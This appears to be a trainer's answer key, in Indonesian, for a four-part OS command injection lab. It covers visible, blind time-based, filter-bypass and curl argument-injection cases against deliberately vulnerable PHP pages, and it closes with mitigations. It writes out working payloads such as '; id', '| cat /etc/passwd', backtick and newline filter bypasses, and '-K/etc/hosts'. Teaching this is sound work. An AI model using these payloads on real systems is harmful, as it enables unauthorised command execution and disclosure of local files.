# Kunci Jawaban — OS Command Injection Lab

> 📌 **Untuk trainer/pendamping.** Dokumen ini berisi payload final, langkah lengkap, dan
> penjelasan *kenapa* tiap payload berhasil untuk ke-4 lab di [README.md](README.md). Jangan
> dibagikan ke peserta sebelum sesi lab selesai.

---

## Lab 1 — Command Injection (visible output) (`lab1_visible.php`)

**Command yang dibangun di server:**
```php
$cmd = "ping -c 2 " . $host;
$output = shell_exec($cmd . ' 2>&1');
```
`$host` (GET) disambung mentah tanpa quoting/escaping apa pun, lalu dijalankan lewat
`shell_exec()` — artinya seluruh string diserahkan ke `/bin/sh -c`, yang menginterpretasi
`;`, `&&`, `|`, backtick, dan `$()` sebagai metakarakter shell.

**Payload:**
```
?host=127.0.0.1; id
?host=127.0.0.1 && whoami
?host=127.0.0.1 | cat /etc/passwd
?host=$(whoami)
```
**Kenapa berhasil:** `;` mengakhiri perintah `ping` lalu menjalankan perintah baru (`id`);
`&&` menjalankan perintah kedua kalau yang pertama sukses; `|` menyalurkan output `ping` ke
`cat /etc/passwd` (yang tetap tampil walau tidak relevan dengan pipe-nya); `$(...)`
disubstitusi *sebelum* `ping` sempat dijalankan.

**Hasil:** output mentah perintah (stdout+stderr, karena ada `2>&1`) ditampilkan langsung ke
halaman — misalnya isi `/etc/passwd` atau output `id`/`whoami`.

---

## Lab 2 — Blind Command Injection (time-based) (`lab2_blind.php`)

**Command yang dibangun di server:**
```php
$cmd = "echo checking domain " . $domain . " > /tmp/domain_check.log 2>&1";
$start = microtime(true);
shell_exec($cmd);
$elapsed = round(microtime(true) - $start, 2);
```
Output perintah dialihkan ke file log dan **tidak pernah** dikembalikan ke halaman — respons
selalu berupa pesan generik `Request submitted for processing. (server time: {elapsed}s)`.
Satu-satunya sinyal yang bocor ke attacker adalah **waktu proses** (`$elapsed`), yang memang
sengaja diukur dan ditampilkan oleh kode ini.

**Langkah:**
1. Baseline: `?domain=example.com` → server time ~0.0x detik (instan).
2. Payload delay:
   ```
   ?domain=example.com; sleep 5
   ?domain=example.com && sleep 5
   ?domain=$(sleep 5)
   ```
3. Bandingkan: kalau injeksi berhasil, `server time` naik jadi ~5.0x detik — inilah bukti RCE
   tanpa perlu melihat output perintah sama sekali (blind).

**Poin diskusi:** karena output di-redirect ke file dan dibuang, teknik in-band (baca output)
mustahil di sini — hanya time-based blind yang bisa membuktikan eksekusi.

---

## Lab 3 — Filter Bypass (`lab3_filter_bypass.php`)

**Filter di server:**
```php
$blacklist = [';', '|', '&'];
$safe_host = str_replace($blacklist, '', $host);
```
Hanya 3 karakter literal (`;`, `|`, `&`) yang dihapus (bukan di-escape) dari input. Karakter
lain yang juga berfungsi sebagai pemisah/eksekusi perintah di shell — **newline**, **backtick**
(`` ` ``), dan **`$()`** — sama sekali tidak disaring.

**Payload:**
```
?host=127.0.0.1%0aid
?host=127.0.0.1 `id`
?host=127.0.0.1 $(id)
```
**Kenapa berhasil:**
- `%0a` (newline) di-decode jadi karakter baris baru sebelum masuk ke filter; `/bin/sh -c`
  memperlakukan newline sama seperti `;` sebagai pemisah perintah, dan newline tidak ada di
  blacklist. Kirim payload ini langsung di address bar, atau lewat Burp Repeater untuk kontrol
  byte mentah yang lebih presisi.
- Backtick dan `$()` melakukan *command substitution* — keduanya tidak ada di blacklist sama
  sekali, jadi lolos tanpa perubahan.

**Hasil:** output `id` (atau perintah lain) tetap tampil di halaman, identik dengan Lab 1,
membuktikan blacklist 3-karakter ini tidak memadai.

---

## Lab 4 — Argument Injection (`lab4_argument_injection.php`)

**Command yang dibangun di server:**
```php
$cmd = "curl -s -m 5 " . escapeshellarg($url);
$output = shell_exec($cmd . ' 2>&1');
```
Berbeda dari Lab 1–3: input **sudah** dibungkus `escapeshellarg()`, yang secara efektif
menutup seluruh celah *shell metacharacter injection* (spasi, `;`, `|`, `&`, backtick, `$()`,
kutip — semuanya diamankan jadi satu argumen shell yang literal). **Tapi** tidak ada pemisah
`--` sebelum argumen tersebut, sehingga kalau nilainya diawali `-`, `curl` sendiri (bukan
shell) yang menafsirkannya sebagai salah satu flag miliknya, bukan sebagai URL.

**Payload:**
```
?url=-h
?url=-V
?url=-K/etc/hosts
```
**Kenapa berhasil (dan kenapa `escapeshellarg()` tidak menyelamatkan di sini):**
`escapeshellarg('-h')` menghasilkan `'-h'` — satu argumen shell yang sah dan literal, sehingga
tidak ada shell metacharacter yang lolos. Tapi begitu `curl` menerima argumen literal `-h`,
`curl` sendiri mem-parsingnya sebagai flag `--help`, bukan sebagai hostname. Ini kelas
kerentanan berbeda dari command injection klasik: seluruhnya terjadi di level *parsing argumen
program tujuan*, bukan di level shell.
- `-h` → curl menampilkan daftar lengkap opsinya (bukti argument injection paling jelas).
- `-V` → curl menampilkan versi & build info (kebocoran informasi lingkungan).
- `-K/etc/hosts` → curl memperlakukan `/etc/hosts` sebagai file konfigurasi (`-K`) dan mencoba
  mem-parsingnya sebagai sintaks config curl; pesan error/output yang muncul membuktikan curl
  berhasil **membaca isi file lokal** tersebut.

**Hasil:** output mentah curl (help text / version banner / error parsing config) tampil di
halaman, membuktikan argumen berhasil disuntikkan meskipun tidak ada satupun karakter shell
yang terlibat.

---

## Ringkasan hasil akhir

| Lab | Teknik | Payload final | Bukti keberhasilan |
|---|---|---|---|
| 1 | In-band | `127.0.0.1; id` | Output `id`/`whoami`/`/etc/passwd` tampil langsung |
| 2 | Blind time-based | `example.com; sleep 5` | `server time` naik ~5 detik |
| 3 | Filter bypass | `127.0.0.1%0aid` (atau backtick/`$()`) | Output `id` tampil meski `;`/`\|`/`&` diblokir |
| 4 | Argument injection | `-h` / `-V` / `-K/etc/hosts` | curl menampilkan help/version/isi `/etc/hosts` |

## Mitigasi (ringkas, lihat [README.md](README.md) untuk versi lengkap)
- Hindari memanggil shell sama sekali bila memungkinkan (pakai library native, mis. ekstensi
  `sockets`/`curl` PHP alih-alih `shell_exec("curl ...")`).
- Kalau harus memanggil proses eksternal, pakai API yang memisahkan argumen secara eksplisit
  (`proc_open()` dengan array argumen, bukan string tunggal) — menghilangkan seluruh kelas
  masalah metakarakter shell (Lab 1–3).
- Allowlist ketat untuk input yang diteruskan ke command (Lab 3), bukan blacklist.
- Untuk argument injection (Lab 4): selalu sisipkan `--` sebelum argumen dari input pengguna,
  dan/atau validasi nilainya tidak diawali karakter `-`.
- Jalankan proses eksternal dengan least privilege di sandbox/container terpisah.
